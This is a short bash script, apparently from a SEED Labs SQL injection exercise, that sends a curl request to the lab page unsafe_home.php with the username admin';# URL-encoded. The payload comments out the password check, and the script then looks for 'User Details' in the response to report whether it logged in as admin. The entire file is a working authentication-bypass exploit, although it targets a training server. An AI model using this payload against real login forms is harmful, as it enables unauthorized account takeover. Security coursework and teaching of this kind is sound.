#!/bin/bash

html=$(curl -s 'www.seed-server.com/unsafe_home.php?username=admin%27%3b%23&Password=123')
trigger='User Details'

if [[ $html == *"$trigger"* ]]; then
    echo "Login as Admin successful"
else
    echo "Login as Admin unsuccessful"
fi

